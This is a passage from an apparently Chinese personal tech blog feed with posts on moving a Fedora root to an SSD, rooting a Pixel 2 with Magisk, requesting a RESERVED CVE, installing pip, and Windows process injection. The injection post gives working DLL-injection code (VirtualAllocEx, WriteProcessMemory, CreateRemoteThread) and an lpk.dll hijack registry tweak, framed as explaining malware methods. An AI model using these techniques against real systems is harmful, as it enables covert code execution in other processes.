文件系统</span><br></pre></td></tr></table></figure><p>将原来系统的 &#x2F; dd 到新的SSD，</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/dev/mapper/fedora-root of=/dev/sdb1 bs=1M</span><br></pre></td></tr></table></figure><p>用新的root 把系统启动起来，reboot 后进入引导界面，按e 编译，找到<br>root&#x3D;&#x2F;dev&#x2F;fedora&#x2F;root 改为 root&#x3D;&#x2F;dev&#x2F;sdb1 按 ctrl+x 启动，一会儿就进系统了，速度<br>提升很大。现在需要把 grub.cfg 更新一下，因为我们是手动修改进入了新的根，如果重启<br>的话，还是会使用老的根，因为grub.cfg 里就是这么写的。</p><p>要生成新的grub.cfg 需要使用grub2-mkconfig, 命令很简单</p><p><code>$ grub2-mkconfig -o /boot/grub2/grub.cfg</code></p><p>执行后重启，md 怎么又进到老根去了。这里折腾了好久，第一个问题fedora 的内核出bug<br>了，每次重启都要等待非常久的时间，所以需要升级，所以正确的顺序应该是先升级系统再<br>dd，没办法升级系统重新 dd</p><p>解决了fedora 内核的问题后，发现还是进不到新根。只要认真地看 grub.cfg, grub2 改动<br>挺大，不太熟悉了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#                                      </span><br><span class="line"># DO NOT EDIT THIS FILE                                                                                                                                                                       #                                                   </span><br><span class="line"># It is automatically generated by grub2-mkconfig using templates                                                                                                                             </span><br><span class="line"># from /etc/grub.d and settings from /etc/default/grub</span><br></pre></td></tr></table></figure><p>启动有两个信息，确实是使用 grub2-mkconfig 生成，&#x2F;etc&#x2F;default&#x2F;grub 里有配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ cat /etc/default/grub</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GRUB_TIMEOUT=5</span><br><span class="line">GRUB_DISTRIBUTOR=&quot;$(sed &#x27;s, release .*$,,g&#x27; /etc/system-release)&quot;</span><br><span class="line">GRUB_DEFAULT=saved</span><br><span class="line">GRUB_DISABLE_SUBMENU=true</span><br><span class="line">GRUB_TERMINAL_OUTPUT=&quot;console&quot;</span><br><span class="line">GRUB_CMDLINE_LINUX=&quot;rd.driver.blacklist=nouveau modprobe.blacklist=nouveau nvidia-drm.modeset=1 rd.lvm.lv=fedora/root rd.lvm.lv=fedora/swap rhgb quiet&quot;                                      </span><br><span class="line">GRUB_DISABLE_RECOVERY=&quot;true&quot;</span><br></pre></td></tr></table></figure><p>grub2-mkconfig 里用这句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GRUB_DEVICE=&quot;`$&#123;grub_probe&#125; --target=device /`&quot;  </span><br></pre></td></tr></table></figure><p>执行查看结果， 发现正确</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ grub2-probe --target=device /</span><br><span class="line"></span><br><span class="line">/dev/sdb1</span><br></pre></td></tr></table></figure><p>可是为什么不能正确启动呢，看看生成的 grub.cfg 文件</p><p>linux16 &#x2F;vmlinuz-4.17.2-200.fc28.x86_64 root&#x3D;UUID&#x3D;290a98e3-7937-49db-a971-4d0e49567cf0</p><p>使用的是 UUID，并不是 &#x2F;dev, 查看一下各分区的 uuid</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># blkid</span></span><br><span class="line"></span><br><span class="line">/dev/sdb1: UUID=<span class="string">&quot;290a98e3-7937-49db-a971-4d0e49567cf0&quot;</span> TYPE=<span class="string">&quot;ext4&quot;</span> PARTUUID=<span class="string">&quot;fe64f395-7520-42c3-939b-b17eb7064cec&quot;</span></span><br><span class="line">/dev/mapper/fedora-root: UUID=<span class="string">&quot;290a98e3-7937-49db-a971-4d0e49567cf0&quot;</span> TYPE=<span class="string">&quot;ext4&quot;</span></span><br></pre></td></tr></table></figure><p>由于dd 的原因，&#x2F;dev&#x2F;sdb1 和 &#x2F;dev&#x2F;mapper&#x2F;fedora-root 的 UUID 居然是相同的。第一个<br>想法是把&#x2F;dev&#x2F;sdb1 的 UUID 给改了。放狗搜发现有下面的方法</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ uuidgen </span><br><span class="line">8e4c27b2-c63e-4d1d-8ac4-5ddd90669eb0</span><br><span class="line"></span><br><span class="line">tune2fs /dev/&#123;device&#125; -U &#123;uuid&#125;</span><br></pre></td></tr></table></figure><p>可是tune2fs 时报错，死活改不过来。lzx 提示可以看看如何是grub.cfg 不使用uuid，<br>发现有个参数 GRUB_DISABLE_UUID&#x3D;true， 在 &#x2F;etc&#x2F;default&#x2F;grub 加上这行，重新生成<br>grub.cfg 重启，一切 OK 进入到SSD 的新root</p><p>有的系统上的参数可能不太一样，ubuntu 系统里这个参数好像的是 GRUB_DISABLE_LINUX_UUID&#x3D;true<br>可能需要确认一下。</p><ul><li>EOF</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;由于某些需求，决定上SSD，提高一下硬盘读写速度。上二手东买了三星(SAMSUNG) 860 EVO&lt;br&gt;最初的想法是作为数据盘使用，即操作系统还是跑在机械硬盘上，仔细一思考，还是折腾&lt;br&gt;一下，要不实在是有些浪费，事实证明，折腾是值得的，感觉就想飞一样。&lt;/p&gt;
&lt;p</summary>
      
    
    
    
    
    <category term="linux" scheme="http://usmacd.com/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>root Pixel2 Android 11 的方法</title>
    <link href="http://usmacd.com/cn/root_android11_pixel2/"/>
    <id>http://usmacd.com/cn/root_android11_pixel2/</id>
    <published>2023-09-06T03:00:51.770Z</published>
    <updated>2023-09-06T03:00:51.770Z</updated>
    
    <content type="html"><![CDATA[<p>要正常使用 frida 首先需要把手机给 root 了， 在最近测试的情况发现 Android 10 和 Android 11 系统工作比较正常， Android 6<br>和其他系统似乎差一些？</p><p>要刷机首先需要下载 <code>adb</code> 等工具，这些工具由 Android 的 SDK platform tools 提供，下载地址为：<a href="https://developer.android.com/studio/releases/platform-tools">https://developer.android.com/studio/releases/platform-tools</a><br>选择相应的操作系统版本下载即可， Google 提供了 Windows、Linux、Mac 等系统的支持。</p><p>基础镜像可以选择的 Google 的官方镜像 Factory Image，如果能自己编译 Android 系统则更好，在调试的时候可以看到系统库的符号。</p><p>我的 Android 手机为 Pixel 2 在 <a href="https://developers.google.com/android/images#walleye">https://developers.google.com/android/images#walleye</a> 上可以查找相应的镜像， 下个最新的 <a href="https://dl.google.com/dl/android/aosp/walleye-rp1a.201005.004.a1-factory-0c23f6cf.zip">https://dl.google.com/dl/android/aosp/walleye-rp1a.201005.004.a1-factory-0c23f6cf.zip</a></p><p>要想刷镜像前提条件是先要解锁 bootloader， Pixel2 新手机解锁的命令和以前有变化，可以参考 <a href="https://source.android.com/devices/bootloader/locking_unlocking">https://source.android.com/devices/bootloader/locking_unlocking</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb reboot bootloader</span><br><span class="line">fastboot flashing unlock_critical</span><br></pre></td></tr></table></figure><p>下载解压后，里面有个 flash-all 的脚本，将手机重启到 fastboot 模式后可以直接运行， <code>adb reboot bootloader</code>， 重启到 fastboot 模式后，执行 flash-all 脚本，刷机系统镜像就完成了。</p><p>以前 root  Android 用的都是 SuperSU 和 TWRP， 这次使用了一个不同的方法 <a href="https://github.com/topjohnwu/Magisk">Magisk</a> ， 安装的方法参见：<br><a href="https://topjohnwu.github.io/Magisk/install.html">https://topjohnwu.github.io/Magisk/install.html</a></p><p>有两种模式， patch boot 或者 patch recovery， 安装 Magisk app 后如果界面显示  <code>Ramdisk：Yes</code>，则需要 patch boot。<br>Magisk app 的下载地址 <a href="https://github.com/topjohnwu/Magisk/releases/download/v23.0/Magisk-v23.0.apk">https://github.com/topjohnwu/Magisk/releases/download/v23.0/Magisk-v23.0.apk</a></p><p>安装 Magisk app 后， 选择需要 patch 的镜像文件，选择后会自动生成新的修改过后的镜像文件。<br>获得修改后的镜像文件后，需要将修改后的镜像文件重新刷一次</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastboot flash boot /path/to/magisk_patched.img <span class="comment">#or fastboot flash recovery /path/to/magisk_patched.img</span></span><br></pre></td></tr></table></figure><p>刷完新的修改后的镜像，重启系统，Root 就完成了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;要正常使用 frida 首先需要把手机给 root 了， 在最近测试的情况发现 Android 10 和 Android 11 系统工作比较正常， Android 6&lt;br&gt;和其他系统似乎差一些？&lt;/p&gt;
&lt;p&gt;要刷机首先需要下载 &lt;code&gt;adb&lt;/code&gt; 等工具，</summary>
      
    
    
    
    
    <category term="Android" scheme="http://usmacd.com/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>How to request a RESERVED CVE</title>
    <link href="http://usmacd.com/cn/request_RESERVED_CVE/"/>
    <id>http://usmacd.com/cn/request_RESERVED_CVE/</id>
    <published>2023-09-06T03:00:51.767Z</published>
    <updated>2023-09-06T03:00:51.767Z</updated>
    
    <content type="html"><![CDATA[<p>在申请 CVE 过程中会遇到一个问题，向软件官方提交漏洞修复后，由于软件官方不是CNA 无法直接分配CVE，而申请CVE 通常需要一个软件官方确认的链接，而有些比较正规的软件在漏洞修复之前是不会有公开链接的，这就无法申请CVE了。</p><p>有点鸡生蛋，蛋生鸡的感觉。解决这个问题的办法是申请一个 RESERVED CVE。</p><h2 id="申请-RESERVED-CVE-方法"><a href="#申请-RESERVED-CVE-方法" class="headerlink" title="申请 RESERVED CVE 方法"></a>申请 RESERVED CVE 方法</h2><p>申请 RESERVED CVE，也是需要填写的CVE 申请表格的 <a href="https://cveform.mitre.org/%EF%BC%8C%E9%80%89%E6%8B%A9">https://cveform.mitre.org/，选择</a> Request CVE ID</p><p>根据提示的重要信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">IMPORTANT: Once a CVE ID is assigned to your vulnerability, it will not be published </span><br><span class="line">in the CVE List until you have submitted a URL pointing to public information about </span><br><span class="line">the vulnerability. Without a public reference, the CVE ID will display as &quot;RESERVED&quot; </span><br><span class="line">in the CVE List. Please update CVE with a reference to the vulnerability&#x27;s </span><br><span class="line">details as soon as possible. See this FAQ for more information.</span><br></pre></td></tr></table></figure><p>只要将 public reference 留空，就可以申请 RESERVED CVE 了。CVE 官方收到请求后会有确认的邮件。</p><h2 id="CVE-官方分配-CVE-ID"><a href="#CVE-官方分配-CVE-ID" class="headerlink" title="CVE 官方分配 CVE ID"></a>CVE 官方分配 CVE ID</h2><p>CVE 官方收到 RESERVED CVE 请求后，会给分配一个 CVE ID，但是状态为 ** RESERVED ** ，不会有公开细节。</p><h2 id="RESERVED-CVE-申请公开"><a href="#RESERVED-CVE-申请公开" class="headerlink" title="RESERVED CVE 申请公开"></a>RESERVED CVE 申请公开</h2><p>当软件官方确认已经修复漏洞，并且发布新版后，可以通知 CVE 官方更新 CVE 的状态。还是通过填写 <a href="https://cveform.mitre.org/">https://cveform.mitre.org/</a> 表格，选择 Notify CVE about a publication，填写相关信息。</p><h2 id="一些注意事项"><a href="#一些注意事项" class="headerlink" title="一些注意事项"></a>一些注意事项</h2><ol><li>将 <a href="mailto:&#99;&#x76;&#x65;&#x2d;&#x72;&#x65;&#x71;&#117;&#101;&#115;&#116;&#x40;&#x6d;&#x69;&#116;&#x72;&#x65;&#x2e;&#x6f;&#114;&#x67;">&#99;&#x76;&#x65;&#x2d;&#x72;&#x65;&#x71;&#117;&#101;&#115;&#116;&#x40;&#x6d;&#x69;&#116;&#x72;&#x65;&#x2e;&#x6f;&#114;&#x67;</a> 和  <a href="mailto:&#x63;&#x76;&#x65;&#64;&#109;&#105;&#116;&#x72;&#x65;&#x2e;&#x6f;&#114;&#x67;">&#x63;&#x76;&#x65;&#64;&#109;&#105;&#116;&#x72;&#x65;&#x2e;&#x6f;&#114;&#x67;</a> 加入邮件白名单 （有可能邮件会被截拦）</li><li>在申请公开步骤中，CVE 官方有可能和你要公开披露的链接，如果软件官方不给写，可以自己写一个</li></ol><p>披露要求的信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[CVE ID]</span><br><span class="line">[PRODUCT]</span><br><span class="line">[VERSION]</span><br><span class="line">[PROBLEM TYPE]</span><br><span class="line">[DESCRIPTION]</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在申请 CVE 过程中会遇到一个问题，向软件官方提交漏洞修复后，由于软件官方不是CNA 无法直接分配CVE，而申请CVE 通常需要一个软件官方确认的链接，而有些比较正规的软件在漏洞修复之前是不会有公开链接的，这就无法申请CVE了。&lt;/p&gt;
&lt;p&gt;有点鸡生蛋，蛋生鸡的感觉。解</summary>
      
    
    
    
    
    <category term="Security" scheme="http://usmacd.com/tags/Security/"/>
    
  </entry>
  
  <entry>
    <title>Python 多版本使用 pip</title>
    <link href="http://usmacd.com/cn/python_pip/"/>
    <id>http://usmacd.com/cn/python_pip/</id>
    <published>2023-09-06T03:00:51.766Z</published>
    <updated>2023-09-06T03:00:51.766Z</updated>
    
    <content type="html"><![CDATA[<p>Q：Fedora 31 提供的 Python3.7， 想使用 Python3.8， 用系统的pip3 只会给 Python3.7 安装库，如何解决</p><p>A:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -O https://bootstrap.pypa.io/get-pip.py</span><br><span class="line">python3.8 get-pip.py</span><br></pre></td></tr></table></figure><p>执行上面命令后，会在 &#x2F;usr&#x2F;local&#x2F;bin&#x2F; 下生成和 pip 相关的脚本，把这些脚本删除，要不可能会和系统的 pip3 冲突。<br>接下来就可以使用下面的命令行安装 Python3.8 的库</p><p><code>python3.8 -m pip install pyhash --user</code></p><p>在安装过程中可能会因为众所周知的原因导致网络出错，备好梯子即可。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Q：Fedora 31 提供的 Python3.7， 想使用 Python3.8， 用系统的pip3 只会给 Python3.7 安装库，如何解决&lt;/p&gt;
&lt;p&gt;A:&lt;/p&gt;
&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class</summary>
      
    
    
    
    
    <category term="Programming" scheme="http://usmacd.com/tags/Programming/"/>
    
  </entry>
  
  <entry>
    <title>Windows 进程注入</title>
    <link href="http://usmacd.com/cn/process_injection/"/>
    <id>http://usmacd.com/cn/process_injection/</id>
    <published>2023-09-06T03:00:51.765Z</published>
    <updated>2023-09-06T03:00:51.765Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-Process-Injection-方法总结"><a href="#1-Process-Injection-方法总结" class="headerlink" title="1. Process Injection 方法总结"></a>1. Process Injection 方法总结</h2><p>  进程注入是windows病毒和恶意软件最常用的手法之一，Windows下进程注入的方法比较<br>多，这里介绍常见的一些方法，以及相应的检查手段。</p><h3 id="1-1-SetWindowsHookEx"><a href="#1-1-SetWindowsHookEx" class="headerlink" title="1.1 SetWindowsHookEx"></a>1.1 SetWindowsHookEx</h3><p> SetWindowsHookEx估计是大家最熟悉的方法了，这个是微软提供给我们使用正规用法。<br>往Windows的hook chain中安装hook 例程，监控系统某种类型的event, 使用这种方法需要<br>实现一个dll。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HHOOK WINAPI <span class="title function_">SetWindowsHookEx</span><span class="params">(</span></span><br><span class="line"><span class="params">  _In_  <span class="type">int</span> idHook,</span></span><br><span class="line"><span class="params">  _In_  HOOKPROC lpfn,</span></span><br><span class="line"><span class="params">  _In_  HINSTANCE hMod,</span></span><br><span class="line"><span class="params">  _In_  DWORD dwThreadId</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><ul><li>dwThread 为0，将监管系统中所有线程。</li><li>idHook        指定监控event的类型</li><li>hMod          dll句柄</li><li>lpfn          hook例程的指针</li></ul><p>MSDN给出了一个使用的例子：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HOOKPROC hkprcSysMsg;</span><br><span class="line"><span class="type">static</span> HINSTANCE hinstDLL; </span><br><span class="line"><span class="type">static</span> HHOOK hhookSysMsg; </span><br><span class="line"> </span><br><span class="line">hinstDLL = <span class="built_in">LoadLibrary</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;c:\\myapp\\sysmsg.dll&quot;</span>)); </span><br><span class="line">hkprcSysMsg = (HOOKPROC)<span class="built_in">GetProcAddress</span>(hinstDLL, <span class="string">&quot;SysMessageProc&quot;</span>); </span><br><span class="line"></span><br><span class="line">hhookSysMsg = <span class="built_in">SetWindowsHookEx</span>( </span><br><span class="line">                    WH_SYSMSGFILTER,</span><br><span class="line">                    hkprcSysMsg,</span><br><span class="line">                    hinstDLL,</span><br><span class="line">                    <span class="number">0</span>); </span><br></pre></td></tr></table></figure><p>值得一提的是这个API只能监控GUI程序，console的程序是监控不了。当年使用的时候还吃<br>了亏。</p><h3 id="1-2-lpk-dll"><a href="#1-2-lpk-dll" class="headerlink" title="1.2 lpk.dll"></a>1.2 lpk.dll</h3><p> 这是一种比较常见的方法，一般把这种方法称为 dll 劫持 (dll hijack),lpk.dll默认<br>的位置在，如果在其他的路径发现lpk.dll就需要需要注意了。</p><p>  这种方法需要实现和原始的lpk.dll一样导出函数，每个函数都转向调用真正的lpk.dll<br>中的导出函数，这样对于程序来说是完全感觉不到什么异常变化的，但是却被伪造的lpk.dll<br>过了一道，所以称为为劫持。</p><p>  这里有二个问题，值得思考。</p><h4 id="如何能让程序加载我们的lpk-dll而不是系统真正的dll"><a href="#如何能让程序加载我们的lpk-dll而不是系统真正的dll" class="headerlink" title="如何能让程序加载我们的lpk.dll而不是系统真正的dll"></a>如何能让程序加载我们的lpk.dll而不是系统真正的dll</h4><p>  如果知道Windows查找dll的顺序，就很容易解决这个问题了，微软的MSDN网站很贴心地<br>  回答了我们的问题。</p><p> <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms682586(v=vs.85).aspx">http://msdn.microsoft.com/en-us/library/windows/desktop/ms682586(v=vs.85).aspx</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a. The directory from which the application loaded.</span><br><span class="line">b. The current directory.</span><br><span class="line">c. The system directory. Use the GetSystemDirectory function to get the path of this directory.</span><br><span class="line">d. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched.</span><br><span class="line">e. The Windows directory. Use the GetWindowsDirectory function to get the path of this directory.</span><br><span class="line">f. The directories that are listed in the PATH environment variable. Note that</span><br><span class="line">   this does not include the per-application path specified by the App</span><br><span class="line">   Paths registry key. The App Paths key is not used when computing the DLL</span><br><span class="line">   search path.</span><br></pre></td></tr></table></figure><p>因此把lpk.dll放到运行的程序同一目录即可。</p><h4 id="为什么选取lpk-dll"><a href="#为什么选取lpk-dll" class="headerlink" title="为什么选取lpk.dll"></a>为什么选取lpk.dll</h4><p>  Windows 7 开始，默认已经不加载LPK.dll了，要Windows 7 默认加载LPK.dll<br>  需要修改注册表，导入下面的注册表, 重启后生效</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"></span><br><span class="line">[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager]</span><br><span class="line">&quot;ExcludeFromKnownDlls&quot;=hex(7):6c,00,70,00,6b,00,2e,00,64,00,6c,00,6c,00,00,00,00,00</span><br></pre></td></tr></table></figure><h3 id="1-3-CreateRemoteThread"><a href="#1-3-CreateRemoteThread" class="headerlink" title="1.3  CreateRemoteThread"></a>1.3  CreateRemoteThread</h3><p>   CreateRemoteThread应该是非常常用的进程注入方法了，有两种常见的使用方法。API<br>原型如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function">HANDLE WINAPI <span class="title">CreateRemoteThread</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">_In_   HANDLE hProcess,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_   LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_   SIZE_T dwStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_   LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_   LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_   DWORD dwCreationFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">_Out_  LPDWORD lpThreadId</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><ul><li>hProcess        要注入的进程的句柄</li><li>lpStartAddress  远程进程中执行的函数的地址（指针）</li><li>lpParameter     远程进程中执行的函数的参数的地址 （指针）</li></ul><h4 id="实现个DLL"><a href="#实现个DLL" class="headerlink" title="实现个DLL"></a>实现个DLL</h4><p>  第一种方法同样是跨进程调用LoadLibrary加载指定的DLL，我们自己实现一个DLL，就可以为所欲为了，呵呵。</p><p>   从API原型中可以看出，需要把数据写入远程的进程，Windows系统提供了WriteProcssMemory<br>来干这个事，但是如何能够保证我们往远程进程写的地址是可写的呢?</p><p>   答案是无法保证。。。所以比较稳妥的方法是我们自己在远程进程中申请一块可写的内<br>存，然后把我们的数据写到远程进程中去。</p><p>   在远程进程中申请内存也有相应的API VirtualAllocEx, 把前前后后都串起来就可以远<br>程注入DLL了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">HANDLE process = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, procID);</span><br><span class="line"><span class="keyword">if</span> (process == <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Error: the specified process couldn&#x27;t be found.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* Get address of the LoadLibrary function.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">LPVOID addr = (LPVOID)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (addr == <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Error: the LoadLibraryA function was not found inside kernel32.dll library.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* Allocate new memory region inside the process&#x27;s address space.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">LPVOID arg = (LPVOID)<span class="built_in">VirtualAllocEx</span>(process, <span class="literal">NULL</span>, <span class="built_in">strlen</span>(buffer), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (arg == <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Error: the memory could not be allocated inside the chosen process.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* Write the argument to LoadLibraryA to the process&#x27;s newly allocated memory region.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span> n = <span class="built_in">WriteProcessMemory</span>(process, arg, buffer, <span class="built_in">strlen</span>(buffer), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (n == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Error: there was no bytes written to the process&#x27;s address space.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* Inject our DLL into the process&#x27;s address space.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">HANDLE threadID = <span class="built_in">CreateRemoteThread</span>(process, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)addr, arg, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (threadID == <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Error: the remote thread could not be created.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Success: the remote thread was successfully created.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* Close the handle to the process, becuase we&#x27;ve already injected the DLL.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">CloseHandle</span>(process);</span><br></pre></td></tr></table></figure><p>   前面的代码示例代码，看起来很正常，基本上CreateRemoteThread的例子都是这么写的<br>但是如果如何看的仔细，还是会发现一个问题，不是说lpStartAddress必须是远程进程中<br>的地址吗，可是LoadLibraryA的地址是注入进程的地址不是远程进程中的地址。</p><p>  很多文章在这里都没有说透，但是牛书《Windows核心编程》对此有着详细的说明。根据<br>经验Windows系统总是把Kernel32.dll映射到进程的相同地址，Windows开启ASLR后，重启后<br>进程中Kernel32.dll的地址会发生变化，但是每个进程中Kernel32.dll的地址仍然相同！<br>所以我们可以在远程的进程使用本地进程的内存中的LoadLibraryA的地址。</p><h4 id="写远程进程内存"><a href="#写远程进程内存" class="headerlink" title="写远程进程内存"></a>写远程进程内存</h4><p>   第二种方法是直接远程注入代码,不注入DLL,其实并不一定要调用CreateRemoteThread<br>还有好几种替代方法,</p><ol><li>CreateRemoteThread最终会调用NtCreateThreadEx Native API，可以直接调用这个<br>  Native API来启动远程的线程。</li><li>RtlCreateUserThread</li></ol><h3 id="1-4-AppInit-DLLs"><a href="#1-4-AppInit-DLLs" class="headerlink" title="1.4 AppInit_DLLs"></a>1.4 AppInit_DLLs</h3><p><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs</code></p><p>   这个键值被《Windows核心编程》介绍而格外出名，可执行文件在处理User32.dll的<br>DLL_PROCESS_ATTACH 时，会使用LoadLibirary加载AppInit_DLLS, 不链接User32.dll的程<br>序将不会加载AppInit_DLLS, 很少程序不需要链接User32.dll</p><p>新版本的Windows增加了几个关键的键值，会对DLL的注入有影响。</p><p><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows 